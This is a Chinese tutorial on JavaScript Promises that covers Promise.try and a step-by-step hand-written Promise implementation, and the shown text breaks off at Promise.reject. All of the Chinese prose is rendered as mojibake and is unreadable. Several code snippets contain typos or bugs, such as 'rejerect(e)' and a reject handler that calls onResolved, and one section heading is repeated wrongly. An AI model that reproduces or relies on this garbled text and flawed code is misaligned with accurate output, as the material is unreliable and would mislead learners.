äº‹å®ä¸Šï¼ŒPromise.tryå­˜åœ¨å·²ä¹…ï¼ŒPromise åº“Bluebirdã€Qå’Œwhenï¼Œæ—©å°±æä¾›äº†è¿™ä¸ªæ–¹æ³•ã€‚ ç”±äºPromise.tryä¸ºæ‰€æœ‰æ“ä½œæä¾›äº†ç»Ÿä¸€çš„å¤„ç†æœºåˆ¶ï¼Œæ‰€ä»¥å¦‚æœæƒ³ç”¨thenæ–¹æ³•ç®¡ç†æµç¨‹ï¼Œæœ€å¥½éƒ½ç”¨Promise.tryåŒ…è£…ä¸€ä¸‹ã€‚è¿™æ ·æœ‰è®¸å¤šå¥½å¤„ï¼Œå…¶ä¸­ä¸€ç‚¹å°±æ˜¯å¯ä»¥æ›´å¥½åœ°ç®¡ç†å¼‚å¸¸ã€‚ &gt;function getUsername(userId) { return database.users.get({id: userId}) .then(function(user) { return user.name; }); &gt;} ä¸Šé¢ä»£ç ä¸­ï¼Œdatabase.users.get()è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ï¼Œå¦‚æœæŠ›å‡ºå¼‚æ­¥é”™è¯¯ï¼Œå¯ä»¥ç”¨catchæ–¹æ³•æ•è·ï¼Œå°±åƒä¸‹é¢è¿™æ ·å†™ã€‚ &gt;database.users.get({id: userId}) &gt;.then(...) &gt;.catch(...) ä½†æ˜¯database.users.get()å¯èƒ½è¿˜ä¼šæŠ›å‡ºåŒæ­¥é”™è¯¯ï¼ˆæ¯”å¦‚æ•°æ®åº“è¿æ¥é”™è¯¯ï¼Œå…·ä½“è¦çœ‹å®ç°æ–¹æ³•ï¼‰ï¼Œè¿™æ—¶ä½ å°±ä¸å¾—ä¸ç”¨try...catchå»æ•è·ã€‚ &gt;try { database.users.get({id: userId}) .then(...) .catch(...) &gt;} catch (e) { // ... &gt;} ä¸Šé¢è¿™æ ·çš„å†™æ³•å°±å¾ˆç¬¨æ‹™äº†ï¼Œè¿™æ—¶å°±å¯ä»¥ç»Ÿä¸€ç”¨promise.catch()æ•è·æ‰€æœ‰åŒæ­¥å’Œå¼‚æ­¥çš„é”™è¯¯ã€‚ &gt;Promise.try(() =&gt; database.users.get({id: userId})) .then(...) .catch(...) äº‹å®ä¸Šï¼ŒPromise.tryå°±æ˜¯æ¨¡æ‹Ÿtryä»£ç å—ï¼Œå°±åƒpromise.catchæ¨¡æ‹Ÿçš„æ˜¯catchä»£ç å—ã€‚ ä¸‰ã€è‡ªå®šä¹‰Promiseæ‰‹å†™ ä¸‹æ–¹çš„Promise.prototype.thenä¸Promise.resolveä¸ºä»€ä¹ˆä¸€ä¸ªæŒ‚è½½åœ¨prototypeè€Œå¦ä¸€ä¸ªæŒ‚è½½åœ¨å®ä¾‹å¯¹è±¡ä¸Š? è§£:åŸå› æ˜¯åˆ†åˆ«ä¸ºé™æ€æ–¹æ³•ä¸å®ä¾‹æ–¹æ³• â€“&gt;ä¸Šé¢çš„éœ€è¦newå®ä¾‹åŒ–çš„æ—¶å€™è‡ªåŠ¨ç»§æ‰¿å®ä¾‹prototypeä¸Šçš„æ–¹æ³•å’Œå±æ€§,æ‰€ä»¥ç”¨å®ä¾‹å¯¹è±¡.then()æ¥è°ƒç”¨,è€Œä¸‹é¢çš„Promise.resolveæ˜¯é™æ€æ–¹æ³•,ä¸ç”¨new,æ˜¯å¯ä»¥ç›´æ¥Promise.resolve()è°ƒç”¨ æ­¤éƒ¨åˆ†å¯ä»¥è·³è¿‡ä¸çœ‹,ç±»ä¼¼æ‰‹æ’•æºç  â… -Promiseçš„å®ä¾‹æ–¹æ³•å®ç°1 - åˆå§‹ç»“æ„æ­å»º htmlå¼•å…¥,è¯¥ç« èŠ‚åç»­htmlå¤§éƒ¨åˆ†é‡å¤ é™¤éå¿…è¦,å¦åˆ™ä¸å†æ”¾ä¸Šæ¥ &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Promise-å°è£… | 1 - åˆå§‹ç»“æ„æ­å»º&lt;/title&gt; &lt;script src=\"./promise.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; let p = new Promise((resolve, reject) =&gt; { resolve('OK'); }); p.then(value =&gt; { console.log(value); }, reason=&gt;{ console.warn(reason); }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; promise.js â€“&gt;ä½¿ç”¨åŸç”Ÿå†™æ³•,æœ€åä¼šæ”¹ä¸ºclasså†™æ³• function Promise(executor){} //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function(onResolved, onRejected){} 2 - resolve ä¸ rejectæ„å»ºä¸åŸºç¡€å®ç° ä½¿ç”¨const self = this;ä¿å­˜thisæ‰§è¡Œ,ä½¿functionä¸­å¯ä»¥å–å¾—å½“å‰å®ä¾‹ ps:å¯ä»¥ä¸ä½¿ç”¨è¯¥æ–¹æ³•ä¿å­˜,ä½†æ˜¯ä¸‹æ–¹functionéœ€è¦æ”¹ä¸ºç®­å¤´å‡½æ•°,å¦åˆ™functioné»˜è®¤æŒ‡å‘æ˜¯window ä¹‹åä»£ç é»˜è®¤ä½¿ç”¨selfä¿å­˜this,ç®­å¤´å‡½æ•°æ–¹å¼å°†åœ¨æœ€åæ”¹ä¸ºclasså†™æ³•æ—¶ä½¿ç”¨ é»˜è®¤è®¾ç½® PromiseState = 'pending'ä»¥åŠ PromiseResult = null,è¿™å°±æ˜¯promiseçŠ¶æ€åŸºç¡€ //å£°æ˜æ„é€ å‡½æ•° function Promise(executor) { //æ·»åŠ å±æ€§ this.PromiseState = 'pending'; this.PromiseResult = null; //ä¿å­˜å®ä¾‹å¯¹è±¡çš„ this çš„å€¼ /* æ­¤å¤„å¯ä»¥ä¸å†™,ä½†æ˜¯ä¸‹é¢functionæ–¹æ³•éœ€è¦æ”¹ä¸ºç®­å¤´å‡½æ•°,å¦åˆ™functioné»˜è®¤æŒ‡å‘æ˜¯window */ const self = this; //resolve å‡½æ•° function resolve(data) {-------------------------------------------- //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) self.PromiseState = 'fulfilled'; // resolved //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) self.PromiseResult = data; } //reject å‡½æ•° function reject(data) {---------------------------------------------- //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) self.PromiseState = 'rejected'; // //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) self.PromiseResult = data; } //åŒæ­¥è°ƒç”¨ã€æ‰§è¡Œå™¨å‡½æ•°ã€ executor(resolve, reject); } //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function (onResolved, onRejected) {} 3 - throw æŠ›å‡ºå¼‚å¸¸æ”¹å˜çŠ¶æ€ åœ¨2çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹:å°†æ‰§è¡Œå™¨æ”¾å…¥try-catch()ä¸­ åœ¨catchä¸­ä½¿ç”¨reject()ä¿®æ”¹ promise å¯¹è±¡çŠ¶æ€ä¸ºã€å¤±è´¥ã€ try { //åŒæ­¥è°ƒç”¨ã€æ‰§è¡Œå™¨å‡½æ•°ã€ executor(resolve, reject); } catch (e) { //ä¿®æ”¹ promise å¯¹è±¡çŠ¶æ€ä¸ºã€å¤±è´¥ã€ reject(e); } 4 - çŠ¶æ€åªèƒ½ä¿®æ”¹ä¸€æ¬¡ åŸºäº2 3ä»£ç ä¸­resolveå’Œrejectæ–¹æ³•è¿›ä¿®æ”¹ åœ¨æˆåŠŸä¸å¤±è´¥å‡½æ•°ä¸­æ·»åŠ åˆ¤æ–­ if(self.PromiseState !== 'pending') return;,å¦‚æœè¿›å…¥å‡½æ•°æ—¶çŠ¶æ€ä¸ä¸ºpendingç›´æ¥é€€å‡º,è¿™æ ·å°±èƒ½åšåˆ°çŠ¶æ€åªèƒ½ä»pendingæ”¹è‡³å…¶ä»–çŠ¶æ€ä¸”åšåˆ°åªèƒ½æ”¹ä¸€æ¬¡ htmlè°ƒç”¨-------------------------------------------------------- let p = new Promise((resolve, reject) =&gt; { reject(\"error\"); resolve('OK'); //æŠ›å‡ºå¼‚å¸¸ // throw \"error\"; }); console.log(p); promise.jsä¿®æ”¹-------------------------------------------------------- //resolve å‡½æ•° function resolve(data){ //åˆ¤æ–­çŠ¶æ€ if(self.PromiseState !== 'pending') return; //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) self.PromiseState = 'fulfilled';// resolved //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) self.PromiseResult = data; } //reject å‡½æ•° function reject(data){ //åˆ¤æ–­çŠ¶æ€ if(self.PromiseState !== 'pending') return; //1. ä¿®æ”¹å¯¹è±¡çš„çŠ¶æ€ (promiseState) self.PromiseState = 'rejected';// //2. è®¾ç½®å¯¹è±¡ç»“æœå€¼ (promiseResult) self.PromiseResult = data; } 5 - then æ–¹æ³•æ‰§è¡Œå›è°ƒåŸºç¡€å®ç° ä¿®æ”¹Promise.prototype.thenæ–¹æ³• ä¼ å…¥then(æˆåŠŸå›è°ƒ,å¤±è´¥å›è°ƒ),å½“è°ƒç”¨thenå,ä¼šåˆ¤æ–­å½“å‰this.PromiseStateçš„çŠ¶æ€,å½“å…¶ä¸ºæˆåŠŸæ—¶è°ƒç”¨æˆåŠŸå›è°ƒ,å¤±è´¥æ—¶è°ƒç”¨å¤±è´¥å›è°ƒ htmlè°ƒç”¨------------------------------------------------------------ let p = new Promise((resolve, reject) =&gt; { // resolve('OK');// reject(\"Error\"); throw \"ERROR\"; }); p.then( value =&gt; {console.log(value); }, reason =&gt; {console.warn(reason);} ) promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function (onResolved, onRejected) { //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState if (this.PromiseState === 'fulfilled') {onResolved(this.PromiseResult);} if (this.PromiseState === 'rejected') {onRejected(this.PromiseResult);} } 6 - å¼‚æ­¥ä»»åŠ¡ then æ–¹æ³•å®ç° æ­¤å¤„å¯¹äº5æœ‰å››å¤„ä¿®æ”¹,ä¸‹é¢ä¸Šjsä»£ç  å½“æˆ‘è¿è¡Œå¼‚æ­¥ä»£ç å,æˆ‘çš„æ‰§è¡Œå™¨å†…éƒ¨ä»£ç è¿˜æœªè¿”å›(å› ä¸ºç”¨äº†å®šæ—¶å™¨,é‡Œé¢çš„ä»£ç è¿›å…¥äº†å¼‚æ­¥é˜Ÿåˆ—),æ‰€ä»¥å½“æˆ‘ä¸‹é¢çš„.then()è¿è¡Œæ—¶:æˆ‘çš„pä¸ºpendingçŠ¶æ€,æ‰€ä»¥æ ¹æœ¬ä¸ä¼šæ‰§è¡Œresolveä¸rejectæ–¹æ³• è§£:æ·»åŠ åˆ¤æ–­pendingçŠ¶æ€,å°†å½“å‰å›è°ƒå‡½æ•°ä¿å­˜åˆ°å®ä¾‹å¯¹è±¡(å­˜åˆ°å®ä¾‹ä¸Šæ˜¯ä¸ºäº†æ›´æ–¹ä¾¿)ä¸­,è¿™æ ·åç»­æ”¹å˜çŠ¶æ€æ—¶å€™æ‰è°ƒç”¨å¾—åˆ° ä¸ºä»€ä¹ˆè¦å°†å›è°ƒä¿å­˜åˆ°å®ä¾‹ä¸Šè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨? ç†ç”±:å› ä¸ºæˆ‘çš„å›è°ƒå‡½æ•°éœ€è¦åœ¨æˆ‘çš„promiseçŠ¶æ€æ”¹å˜å(æˆåŠŸæˆ–è€…å¤±è´¥),å†æ ¹æ®çŠ¶æ€é€‰æ‹©è¿è¡Œå“ªä¸ªå‡½æ•°æ‰€ä»¥å½“ä½ è°ƒç”¨then()æ—¶å´æ£€æµ‹åˆ°çŠ¶æ€ä¸ºpending,è¯´æ˜è¿™æ—¶å€™çš„promiseåœ¨å¼‚æ­¥é˜Ÿåˆ— ä¸èƒ½ç›´æ¥è¿è¡ŒæˆåŠŸæˆ–è€…å¤±è´¥å‡½æ•° è§£å†³:å› ä¸ºresolveä¸rejectæ–¹æ³•ä¸then()ä¸åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸä¸­,å¹¶ä¸èƒ½å…±äº«then(æˆåŠŸå›è°ƒ,å¤±è´¥å›è°ƒ)çš„å‚æ•°,æ‰€ä»¥åœ¨åˆ¤æ–­çŠ¶æ€ä¸ºpendingæ—¶å°†å›è°ƒä¿å­˜åˆ°å®ä¾‹å¯¹è±¡ä¸Š.ç„¶åå°†å›è°ƒå‡½æ•°çš„è°ƒç”¨æ”¾åœ¨resolve()ä¸reject()ä¸­ è¿™æ ·å½“æˆ‘ä»£ç è¿è¡Œåˆ°å¼‚æ­¥é˜Ÿåˆ—çš„resolve()æˆ–reject()æ—¶,å°±å¯ä»¥åœ¨è¿™ä¸ªå‡½æ•°ä¸­è¿è¡Œå›è°ƒå‡½æ•°,å®ç°å¼‚æ­¥then æ­¤å¤„çš„thenä»æœ‰ç‘•ç–µ,éœ€è¦ç»§ç»­å®Œå–„ htmlè°ƒç”¨------------------------------------------------------------ //å®ä¾‹åŒ–å¯¹è±¡ let p = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {reject(\"error\"); /* resolve('OK');*/}, 1000); }); p.then(value =&gt; {console.log(value);},reason =&gt; { console.warn(reason);}); console.log(p); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //å£°æ˜æ„é€ å‡½æ•° function Promise(executor) { this.PromiseState = 'pending'; this.PromiseResult = null; // å£°æ˜å±æ€§ this.callback = {}; -----------æ–°æ·»åŠ 1 const self = this; //resolve å‡½æ•° function resolve(data) { //åˆ¤æ–­çŠ¶æ€ if (self.PromiseState !== 'pending') return; self.PromiseState = 'fulfilled'; self.PromiseResult = data; //è°ƒç”¨æˆåŠŸçš„å›è°ƒå‡½æ•° åŠ åˆ¤æ–­çš„åŸå› æ˜¯é˜²æ­¢æ— å›è°ƒæŠ¥é”™ if (self.callback.onResolved) { self.callback.onResolved(data); } ------------æ–°æ·»åŠ 2 æœ€é‡è¦ } //reject å‡½æ•° function reject(data) { if (self.PromiseState !== 'pending') return; self.PromiseState = 'rejected'; self.PromiseResult = data; //æ‰§è¡Œå›è°ƒ if (self.callback.onResolved) { self.callback.onResolved(data);} ------------æ–°æ·»åŠ 3 } try {executor(resolve, reject);} catch (e) {reject(e);} } //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function (onResolved, onRejected) { //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState if (this.PromiseState === 'fulfilled') {onResolved(this.PromiseResult);} if (this.PromiseState === 'rejected') { onRejected(this.PromiseResult);} //åˆ¤æ–­ pending çŠ¶æ€ if (this.PromiseState === 'pending') { ------------æ–°æ·»åŠ 4 //ä¿å­˜å›è°ƒå‡½æ•° this.callback = { onResolved: onResolved, onRejected: onRejected } } } 7 - æŒ‡å®šå¤šä¸ªå›è°ƒ åŸºäº6ä»£ç è¿›è¡Œä¿®æ”¹ åªå±•ç¤ºä¿®æ”¹éƒ¨åˆ†ä»£ç  6ä¸­ä¿å­˜å›è°ƒå‡½æ•°çš„æ–¹å¼æœ‰BUG,å¦‚æœæˆ‘æœ‰å¤šä¸ª.then(),åé¢åŠ è½½çš„å›è°ƒå‡½æ•°ä¼šè¦†ç›–ä¹‹å‰çš„å›è°ƒå‡½æ•°,å¯¼è‡´æœ€åå›è°ƒå‡½æ•°æœ‰ä¸”åªæœ‰æœ€åä¸€ä¸ª è§£:ä½¿ç”¨æ•°ç»„çš„æ–¹å¼è¿›è¡Œå­˜å‚¨å›è°ƒå‡½æ•°,è°ƒç”¨æ—¶ä¹Ÿæ˜¯ç”¨æ•°ç»„å¾ªç¯å–å‡º æ­¤å¤„çš„thenä»æœ‰ç‘•ç–µ,éœ€è¦ç»§ç»­å®Œå–„ htmlè°ƒç”¨------------------------------------------------------------ //å®ä¾‹åŒ–å¯¹è±¡ let p = new Promise((resolve, reject) =&gt; {setTimeout(() =&gt; {reject('No');}, 1000);}); p.then(value =&gt; { console.log(value);}, reason=&gt;{console.warn(reason);}); p.then(value =&gt; { alert(value);}, reason=&gt;{ alert(reason);}); console.log(p); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- Promise.prototype.then = function (onResolved, onRejected) { //resolve å‡½æ•° function resolve(data){ ..... //è°ƒç”¨æˆåŠŸçš„å›è°ƒå‡½æ•° // if (self.callback.onResolved) { self.callback.onResolved(data); } self.callbacks.forEach(item =&gt; { --------ä¿®æ”¹1 item.onResolved(data); }); } //reject å‡½æ•° function reject(data){ ...... //æ‰§è¡Œå¤±è´¥çš„å›è°ƒ // if (self.callback.onResolved) { self.callback.onResolved(data);} self.callbacks.forEach(item =&gt; { ------ä¿®æ”¹2 item.onRejected(data); }); } //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function(onResolved, onRejected){ ........ //åˆ¤æ–­ pending çŠ¶æ€ if(this.PromiseState === 'pending'){ //ä¿å­˜å›è°ƒå‡½æ•° // this.callback = { onResolved: onResolved, onRejected: onRejected } this.callbacks.push({ --------ä¿®æ”¹3 onResolved: onResolved, onRejected: onRejected }); } } 8 - åŒæ­¥ä»»åŠ¡ then è¿”å›ç»“æœ åœ¨ä¹‹å‰çš„thenè¿è¡Œç»“æœä¸­å¾—çŸ¥,æˆ‘ä»¬ä½¿ç”¨ [ then ] åçš„è¿”å›ç»“æœæ˜¯å…¶å›è°ƒå‡½æ•°çš„è¿”å›ç»“æœ,è€Œæˆ‘ä»¬éœ€è¦çš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªæ–°çš„promiseå¯¹è±¡ è§£:æ‰€ä»¥æˆ‘ä»¬åœ¨thenä¸­return new Promise(),ä½¿å…¶å¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ–°çš„promiseå¯¹è±¡ åœ¨ä¸ºè§£å†³é—®é¢˜1åäº§ç”Ÿä¸€ä¸ªæ–°é—®é¢˜:æ–°çš„promiseå¯¹è±¡å› ä¸ºæ²¡æœ‰ç”¨rejerectä¸resolveæ–¹æ³•,å¯¼è‡´è¿”å›çš„çŠ¶æ€ä¸€ç›´æ˜¯pending è§£:åœ¨æ–°çš„promiseä¸­åˆ¤æ–­è¿è¡Œå›è°ƒå‡½æ•°åçš„è¿”å›å€¼æ˜¯ä»€ä¹ˆ,ç„¶åæ ¹æ®å…¶ä¸åŒç±»å‹ç»™å…¶èµ‹äºˆä¸åŒçŠ¶æ€ â€‹ â… -if(result instanceof Promise):è¿”å›å€¼ä¸€ä¸ªæ–°çš„â‘¡promiseå¯¹è±¡(å› ä¸ºæ˜¯æ–°çš„promiseçš„å›è°ƒå‡½æ•°è¿”å›å€¼,ç§°â‘¡promiseå¯¹è±¡),åœ¨è¿”å›å€¼(å› ä¸ºæ˜¯promiseå¯¹è±¡)çš„.then()å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨rejerectä¸resolveæ–¹æ³•,å°†å…¶è‡ªèº«çš„çŠ¶æ€èµ‹äºˆå¤–å±‚çš„promise, â€‹ å³ å›è°ƒå‡½æ•°ä¸­çš„promise èµ‹å€¼ ç»™thenè¿”å›å€¼ , æ‰€ä»¥ æœ€ç»ˆè¿”å›çŠ¶æ€==å›è°ƒå‡½æ•°ä¸­çš„æ–°promiseçŠ¶æ€ â€‹ â…¡-å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªépromiseå¯¹è±¡,è¿”å›çŠ¶æ€è®¾ç½®ä¸ºæˆåŠŸ â€‹ â…¢-å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå¼‚å¸¸,è¿”å›çŠ¶æ€è®¾ç½®ä¸ºå¤±è´¥ htmlè°ƒç”¨------------------------------------------------------------ //å®ä¾‹åŒ–å¯¹è±¡ let p = new Promise((resolve, reject) =&gt; {resolve('OK');}); //æ‰§è¡Œ then æ–¹æ³• const res = p.then( value =&gt; { throw \"FAIL\";}, reason =&gt; { console.warn(reason);}); console.log(res); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function(onResolved, onRejected){ return new Promise((resolve, reject) =&gt; { //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState // if(this.PromiseState === 'fulfilled'){ onResolved(this.PromiseResult);} æœªä¿®æ”¹æ—¶ä»£ç  if(this.PromiseState === 'fulfilled'){ -------ä¿®æ”¹1 try{ //è·å–å›è°ƒå‡½æ•°çš„æ‰§è¡Œç»“æœ let result = onResolved(this.PromiseResult); //åˆ¤æ–­ if(result instanceof Promise){//å¦‚æœæ˜¯ Promise ç±»å‹çš„å¯¹è±¡,æˆ‘å°±å°†ä¸‹ä¸€ä¸ªpromiseç»“æœèµ‹äºˆå¤–å±‚ result.then(v =&gt; { resolve(v); },r=&gt;{reject(r);}) }else{resolve(result);} //å¦‚æœè¿”å›çš„ä¸æ˜¯promiseå¯¹è±¡,éƒ½å°†å…¶èµ‹äºˆæˆåŠŸçŠ¶æ€ }catch(e){ rejerect(e); //å¦‚æœå‡ºé”™äº†,åˆ™è¿”å›å¤±è´¥çŠ¶æ€ } } if(this.PromiseState === 'rejected'){ onRejected(this.PromiseResult);}------æ­¤éƒ¨åˆ†ä¿®æ”¹ä¸ä¿®æ”¹1ä¸€æ · //åˆ¤æ–­ pending çŠ¶æ€ if(this.PromiseState === 'pending'){ this.callbacks.push({ onResolved: onResolved, onRejected: onRejected}); } }) } 9 - å¼‚æ­¥ä»»åŠ¡ then è¿”å›ç»“æœ å¼‚æ­¥ä»»åŠ¡æ˜¯ä¿®æ”¹if(this.PromiseState === 'pending')åé¢çš„å€¼,åŸå› å‚è€ƒ6,ä¸‹é¢ä»£ç åªä¸¾ä¾‹è¿™éƒ¨åˆ†ä¿®æ”¹ å› ä¸ºæˆ‘ä»¬éœ€è¦å¢åŠ thençŠ¶æ€ä¿®æ”¹,æ‰€ä»¥åœ¨æˆ‘ä»¬ä¿å­˜å›è°ƒå‡½æ•°è¿™ä¸€æ­¥æˆ‘ä»¬å¯ä»¥å¯¹äºå›è°ƒå‡½æ•°è¿›è¡ŒåŠ å·¥,æ·»åŠ åˆ¤æ–­å…¶å›è°ƒå‡½æ•°çš„è¿”å›å€¼çš„ä»£ç å—å†å­˜å…¥å®ä¾‹çš„å›è°ƒå‡½æ•°ä¸­ â… -å£°æ˜ä¸€ä¸ªæ–°çš„å‡½æ•°:å…¶å†…éƒ¨åŠŸèƒ½-&gt;å…ˆè¿è¡ŒonResolvedå›è°ƒå‡½æ•°,å†å°†å…¶è¿”å›å€¼å–å‡º,è¿›è¡Œåˆ¤æ–­å…¶è¿”å›å€¼(è¿™ä¸ªè¿‡ç¨‹åŒ8) â…¡-åŠ å·¥åå­˜å…¥å®ä¾‹å›è°ƒå‡½æ•°æ•°ç»„,ä¹‹ååœ¨resolveä¸rejectæ–¹æ³•ä¸­è°ƒç”¨å³å¯(åŒ6) htmlè°ƒç”¨------------------------------------------------------------ //å®ä¾‹åŒ–å¯¹è±¡ let p = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {reject(\"Error\");}, 1000)}); // resolve('OK'); //æ‰§è¡Œ then æ–¹æ³• const res = p.then(value =&gt; { // return 'oh Yeah'; //å¦‚æœæœ‰è¿”å›,æ ¹æ®å…¶è¿”å›å€¼å¾—åˆ°ç›¸åº”çš„çŠ¶æ€:å­—ç¬¦ä¸²ä¸ºæˆåŠŸ,æŠ›å‡ºä¸ºé”™è¯¯ throw 'error'; }, reason =&gt; { console.warn(reason, \"xx\"); //å¦‚æœåªæ˜¯æ‰“å°æ²¡è¿”å›,åˆ™å®é™…ä¸Šæ—¶è¿”å›ä¸€ä¸ªundefined, //åœ¨æˆ‘ä»¬å°è£…jsä¸­,undefinedä¼šåˆ¤å®šä¸ºépromiseå¯¹è±¡,æ‰€ä»¥çŠ¶æ€ä¸ºæˆåŠŸ,ç»“æœä¸ºundefined return \"sss\" // throw 'error'; }); console.log(res); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //åˆ¤æ–­ pending çŠ¶æ€ if (this.PromiseState === 'pending') { //ä¿å­˜å›è°ƒå‡½æ•° this.callbacks.push({ onResolved: function () { try { //æ‰§è¡ŒæˆåŠŸå›è°ƒå‡½æ•° let result = onResolved(self.PromiseResult); //åˆ¤æ–­ å…¶ç»“æœ if (result instanceof Promise) { result.then( v =&gt; { resolve(v);}, r =&gt; {reject(r);} ) } else {resolve(result);} } catch (e) {reject(e);} }, onRejected: function () { try { //æ‰§è¡ŒæˆåŠŸå›è°ƒå‡½æ•° let result = onRejected(self.PromiseResult); //åˆ¤æ–­ if (result instanceof Promise) { result.then( v =&gt; {resolve(v); }, r =&gt; {reject(r);} ) } else {resolve(result);} } catch (e) { reject(e); } } }); } 10- thenæ–¹æ³•ä»£ç ä¼˜åŒ– åœ¨8ã€9ã€10ä¸­å¯ä»¥çœ‹å‡º,å…¶åˆ¤æ–­ä¸æ”¹å˜è¿”å›ç»“æœçŠ¶æ€çš„ä»£ç å—æ˜¯åŸºæœ¬é‡å¤çš„,æ‰€ä»¥å¯ä»¥å°†å…¶æŠ½å‡º //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function (onResolved, onRejected) { const self = this; return new Promise((resolve, reject) =&gt; { å°è£…å‡½æ•°---------------------------------------------------------------------------- function callback(type) { try { //è·å–å›è°ƒå‡½æ•°çš„æ‰§è¡Œç»“æœ let result = type(self.PromiseResult); //åˆ¤æ–­ if (result instanceof Promise) { //å¦‚æœæ˜¯ Promise ç±»å‹çš„å¯¹è±¡ result.then(v =&gt; { resolve(v); }, r =&gt; { reject(r); }) } else { //ç»“æœçš„å¯¹è±¡çŠ¶æ€ä¸ºã€æˆåŠŸã€ resolve(result); } } catch (e) { reject(e); } } ----------------------------------------------------------------------------------- //è°ƒç”¨å›è°ƒå‡½æ•° PromiseState if (this.PromiseState === 'fulfilled') { callback(onResolved); } if (this.PromiseState === 'rejected') { callback(onRejected); } //åˆ¤æ–­ pending çŠ¶æ€ if (this.PromiseState === 'pending') { //ä¿å­˜å›è°ƒå‡½æ•° this.callbacks.push({ onResolved: function () { callback(onResolved); }, onRejected: function () { callback(onRejected); } }); } }) } 11 - catch æ–¹æ³•ä¸å¼‚å¸¸ç©¿é€ä¸å€¼ä¼ é€’ å¼‚å¸¸ç©¿é€:æ·»åŠ catch æ–¹æ³• ,å¹¶ä¸”éœ€è¦è¿›è¡Œå›è°ƒå‡½æ•°ä¸ºundefinedçš„å¤„ç† å½“æˆ‘then()ä¸­åªä¼ ä¸€ä¸ªå›è°ƒæˆ–è€…ä¸ä¼ å›è°ƒå‡½æ•°æ—¶,è¿è¡Œä»£ç ä¼šæŠ¥é”™,å› ä¸ºè¿è¡Œæ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•°æ˜¯undefined è§£:è¿›è¡Œå›è°ƒå‡½æ•°åˆ¤æ–­,å½“å…¶ä¸ºç©ºæ—¶,åŸºäºé»˜è®¤å›è°ƒå‡½æ•°å†…å®¹:ç›´æ¥å¾€å¤–æŠ›å‡ºè¿™æ ·ä¸‹æ–¹çš„then() or catch()å°±å¯ä»¥æ‰¿æ¥åˆ°å¼‚å¸¸æˆ–è€…å€¼ htmlè°ƒç”¨------------------------------------------------------------ //å®ä¾‹åŒ–å¯¹è±¡ let p = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; {resolve('OK'); }, 1000); }); //å€¼ä¼ é€’ p.then() .then(value =&gt; {console.log(222);}) .then(value =&gt; {console.log(333);}) .catch(reason =&gt; {console.warn(reason);}); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  then æ–¹æ³• Promise.prototype.then = function (onResolved, onRejected) { ... -----------ä¿®æ”¹1 if (typeof onRejected !== 'function') {onRejected = reason =&gt; { throw reason;}} if (typeof onResolved !== 'function') { onResolved = value =&gt; value;} .... } //æ·»åŠ  catch æ–¹æ³• Promise.prototype.catch = function(onRejected){ ---------------å¼‚å¸¸ç©¿é€ ä¿®æ”¹2 return this.then(undefined, onRejected); } â…¡-Promiseçš„é™æ€æ–¹æ³•å®ç°1 - Promise.resolve å°è£… åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºpromiseå¯¹è±¡: â… -å¦‚æœä¸ºpromise:å°†å…¶çŠ¶æ€ä¸ç»“æœèµ‹å€¼ç»™å¤–å±‚promiseå¯¹è±¡ â…¡-å¦‚æœä¸ºépromise:çŠ¶æ€è®¾ç½®ä¸ºæˆåŠŸ htmlè°ƒç”¨------------------------------------------------------------ const p = Promise.resolve('OK'); const p2 = Promise.resolve(new Promise((resolve, reject) =&gt; { reject(\"error\");// resolve('Success'); })); const p3 = Promise.resolve(Promise.resolve('Oh Yeah')); console.log(p3); promise.jsä¿®æ”¹ä¸å®ç°----------------------------------------------------- //æ·»åŠ  resolve æ–¹æ³• Promise.resolve = function(value){ //è¿”å›promiseå¯¹è±¡ return new Promise((resolve, reject) =&gt; { if(value instanceof Promise){ value.then( v=&gt;{resolve(v);}, r=&gt;{reject(r);} )}else{resolve(value); }//çŠ¶æ€è®¾ç½®ä¸ºæˆåŠŸ }); } 2 - Promise.resolve å°è£… ä¸åŒäºresolve,è¿™ä¸ªæ–¹æ³•åªè¦æŠŠä¼ å…¥å‚æ•°å†æ¬¡ä¼ å‡ºå»,å¹¶å°†çŠ¶æ€æ”¹ä¸ºå¤±è´¥å³å¯ htmlè°ƒç”¨------------------------------------------------------------ //Promise.reject const p = Promise.reject('Error'); const p2 = 